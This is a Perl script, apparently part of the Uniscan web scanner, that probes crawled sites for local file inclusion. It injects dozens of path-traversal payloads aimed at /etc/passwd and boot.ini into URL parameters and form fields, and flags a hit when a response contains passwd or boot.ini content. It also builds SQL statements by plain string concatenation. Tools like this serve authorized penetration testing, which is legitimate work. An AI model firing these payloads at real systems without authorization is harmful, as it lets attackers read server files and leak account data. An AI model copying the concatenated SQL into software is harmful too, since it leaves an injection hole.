#!/usr/bin/perl -w

use Uniscan::Configure;
use Uniscan::Functions;
use Uniscan::Http;
use threads;
use threads::shared;
use Thread::Queue;
use Thread::Semaphore;

my $c = Uniscan::Configure->new(conffile => "uniscan.conf");
my $func = Uniscan::Functions->new();
my $http = Uniscan::Http->new();
my $q = new Thread::Queue;
my $semaphore = Thread::Semaphore->new();

our %conf = ( );
%conf = $c->loadconf();
$|++;

#metricas
our $requests : shared = 0;
our %testado : shared = ();
our $arqs : shared = 0;
our $vuls : shared = "";
our %vtestado : shared = ();
our $varst : shared = 0;
our %varvul : shared = ();
our $vvar : shared = 0;
our %arqvul : shared = ();
our $arqv : shared = 0;



our $report_id :shared = $ARGV[0];
my @urls = $func->pega_dados_crawler($report_id);

our @LFI = ('../../../../../../../../../../etc/passwd%00',
			'../../../../../../../../../../etc/passwd%00.jpg',
			'../../../../../../../../../../etc/passwd%00.html',
			'../../../../../../../../../../etc/passwd%00.htm',
			'../../../../../../../../../../etc/passwd%00.css',
			'../../../../../../../../../../etc/passwd%00.php',
			'../../../../../../../../../../etc/passwd%00.txt',
			'../../../../../../../../../../etc/passwd%00.inc',
			'../../../../../../../../../../etc/passwd%00.png',
			'../../../../../../../../../../etc/passwd',
			'//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd',
			'//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
			'//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
			'//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
			'//....................etc/passwd',
			'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.',
			'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
			'/\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../etc/passwd',
			'/../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd%00',
			'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd',
			'../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
			'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
			'..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.jpg',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.html',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.css',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.php',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.txt',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.inc',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.png',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini',
			'/../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd\0',
			'../../../../../../../../../../etc/passwd\0',
			'../../../../../../../../../../etc/passwd\0.jpg',
			'../../../../../../../../../../etc/passwd\0.html',
			'../../../../../../../../../../etc/passwd\0.htm',
			'../../../../../../../../../../etc/passwd\0.css',
			'../../../../../../../../../../etc/passwd\0.php',
			'../../../../../../../../../../etc/passwd\0.txt',
			'../../../../../../../../../../etc/passwd\0.inc',
			'../../../../../../../../../../etc/passwd\0.png',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0.jpg',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0.html',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0.css',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0.php',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0.txt',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0.inc',
			'..\..\..\..\..\..\..\..\..\..\..\boot.ini\0.png'
			
			);

my $t = threads->new(\&online);
&ScanLFICrawler(@urls);	
&ScanLFICrawlerPost(@urls);
$vuls =~s/'/\\'/gi;
$func->insert("INSERT INTO vulnerabilidade(report_id, dados, arq_testados, arq_vuls, var_testadas, var_vuls, reqs, tipo_id) VALUES($report_id, '$vuls', $arqs, $arqv, $varst, $vvar, $requests, 19)");
$func->insert("UPDATE historico SET lfi = $vvar WHERE report_id= $report_id");
	        while($q->pending > 0){
	                $q->dequeue;
	        }
$t->join();

	
##############################################
#  Function ScanLFICrawler
#  this function check LFI Vulnerabilities 
#
#
#  Param: @urls
#  Return: nothing
##############################################


sub ScanLFICrawler(){
	my @urls = @_;
	my @tests = &GenerateTests("LFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestLFI", @tests) if(scalar(@tests));
}




sub GenerateTests(){
	my ($test, @list) = @_;
	my @list2 = ();
	my %hash = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/ && $line !~/\|#\|/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				no strict 'refs';
				if($var_temp){
					foreach my $str (@{$test}){
						$temp = $line;
						my $t = $var_temp . $str;
						$temp =~ s/\Q$variables[$x]\E//g;
						$temp .= '&' .$t;
						$temp =~s/\?&/\?/g;
						$temp =~s/&&/&/g;
						if(!$hash{$temp}){
							push(@list2, $temp);
							$hash{$temp} = 1;
						}
					}
				}
			}
		@variables = ();
		}
	}
	@list = ();
	return @list2;
}

sub GenerateTestsPost(){
  	my ($test, @list) = @_;
  	my @list2 = ();
	my %hash = ();
  	foreach my $line (@list){
	if($line =~/\|#\|/){
  		my ($url, $line) = split('\|#\|', $line);
  		$line =~ s/&amp;/&/g;
  		$line =~ s/\[\]//g;
			if($line =~ /=/){
				my $temp = $line;
				$temp = substr($temp,index($temp, '?')+1,length($temp));
				my @variables = split('&', $temp);
				for(my $x=0; $x< scalar(@variables); $x++){
					my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
					no strict 'refs';
					if($var_temp){
						foreach my $str (@{$test}){
							$temp = $line;
							
							my $t = $var_temp . $str;
							$temp =~ s/\Q$variables[$x]\E//g;
							$temp .= '&' .$t;
							$temp =~s/\?&/\?/g;
							$temp =~s/&&/&/g;
							if(!$hash{$temp}){
								push(@list2, $url . '|#|' .$temp);
								$hash{$temp} = 1;
							}
						}
					}
				}
			}
		}
	}
  	@list = ();
  	return @list2;
 }




sub threadnize(){
	my ($fun, @tests) = @_;
	foreach my $test (@tests){
		$q->enqueue($test) if($test);
	}

	my $x=0;
	my @threads = ();
	while($q->pending() && $x <= $conf{'max_threads'}-1){
		no strict 'refs';
		push @threads, threads->new(\&{$fun});
		$x++;
		sleep(5);
	}

	sleep(2);
	foreach my $running (@threads) {
		$running->join();
	}
	@threads = ();
}



##############################################
#  Function ScanLFICrawlerPost
#  this function check LFI Vulnerabilities 
#  on forms
#
#  Param: @urls
#  Return: nothing
##############################################

sub ScanLFICrawlerPost(){
	my @urls = @_;
	my @tests = &GenerateTestsPost("LFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestLFIPost", @tests) if(scalar(@tests));
}




##############################################
#  Function TestLFI
#  this function test LFI Vulnerabilities 
#
#
#  Param: $test
#  Return: nothing
##############################################

sub TestLFI(){

my ($resp, $test) = 0;
	while($q->pending > 0){
		$semaphore->down();
		$test = $q->dequeue;
		$semaphore->up();
		next if(not defined $test);
		next if($test =~/\|#\|/g);
		if(!$varvul{&gera_var_vul($test)}){
			&metrica_testados($test);
			$resp = $http->GET($test);
			$requests++;
			if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
				$vuls .= $test."\n";
				&metricas_vul($test);
			}
			$resp = 0;
		}
	}
	$q->enqueue(undef);
}


##############################################
#  Function TestLFIPost
#  this function test LFI Vulnerabilities 
#  on forms
#
#  Param: $test
#  Return: nothing
##############################################

sub TestLFIPost(){
	while($q->pending > 0){
		$semaphore->down();
		my $test = $q->dequeue;
		$semaphore->up();
		next if(not defined $test);
		next if($test !~ /\|#\|/);
		if($test =~ /\|#\|/){
			my ($url, $data) = split('\|#\|', $test);
			if(!$varvul{&gera_var_vul($url."|#|".$data)}){
				&metrica_testados($url."|#|". $data);
				my $resp = $http->POST($url, $data);
				$requests++;
				if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
					
					$vuls .= $url."|#|".$data."\n";
					&metricas_vul($url."|#|". $data);
				}
				$resp = 0;
			}
		}
	}
	$q->enqueue(undef);
}



sub gera_var_vul(){
	my $url = shift;
	my $varl = substr($url, rindex($url, '&')+1, length($url));
	my ($var, $valor) = split('=', $varl);
	my $str = $func->get_file($url) . $var;
	return $str;
	
}

sub metricas_vul(){
	my $url = shift;
	if(!$arqvul{$func->get_file($url)}){
		$arqvul{$func->get_file($url)} = 1;
		$arqv++;
	}
	
	if(!$varvul{&gera_var_vul($url)}){
		$varvul{&gera_var_vul($url)} = 1;
		$vvar++;
	}
}

sub metrica_testados(){
	my $url = shift;
	if(!$testado{$func->get_file($url)}){
		$testado{$func->get_file($url)}=1;
		$arqs++;
	}
	if(!$vtestado{&gera_var_vul($url)}){
		$vtestado{&gera_var_vul($url)}=1;
		$varst++;
	}	
}



sub checa_online(){
        my $h = Uniscan::Http->new();
        my $x=0;
        my $site = $func->pega_site($report_id);
        while ($x<=10) {
                my $res = $h->GET1($site);
                if ($res->is_success) {
                        return 1;
                }
                else{
                        sleep(30);
                }
                $x++;
        }
        &grava_waf();
        return 0;
}

sub grava_waf(){
        $func->insert("UPDATE report SET waf=1 WHERE report_id=". $report_id);
}

sub online(){
        while(checa_online() && $q->pending > 0){
                sleep(10);
        }
	#exit();
        while($q->pending > 0){
                $q->dequeue;
        }
}

